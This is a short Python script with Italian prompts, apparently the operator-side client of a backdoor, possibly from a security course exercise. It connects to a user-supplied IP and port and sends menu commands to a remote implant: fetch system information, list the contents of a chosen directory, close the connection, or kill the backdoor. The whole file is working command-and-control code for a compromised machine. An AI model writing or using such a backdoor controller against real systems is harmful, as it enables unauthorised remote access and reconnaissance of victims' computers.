import socket as so

SRV_ADDR = input("Dammi l'ip a cui mi devo collegare: ")
SRV_PORT = int(input("Insersci la porta di connessione: "))

def print_menu():
    print("\n",
          "0) Chiudi connessione", 
          "1) Informazioni sul sistema",
          "2) Lista il contenuto directory",
          "9) Uccidi la backdoor", sep="\n")

# creaiamo la connessione
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((SRV_ADDR, SRV_PORT))

print("Connessione stabilita")
print_menu()

while True:
    message = input("\n-Seleziona un opzione: ")

    if message == "0" or message == "9":
        s.sendall(message.encode())
        s.close()
        break
    elif message == "1":
        s.sendall(message.encode())
        data = s.recv(1024)
        if not data: break
        print(data.decode("utf-8"))
    elif message == "2":
        path = input("Inserisci il percorso: ")
        s.sendall(message.encode())
        s.sendall(path.encode())
        data = s.recv(1024)
        data = data.decode('utf-8').split(",")
        print("*"*40)
        for x in data: print(x)
        print("*"*40)
        
    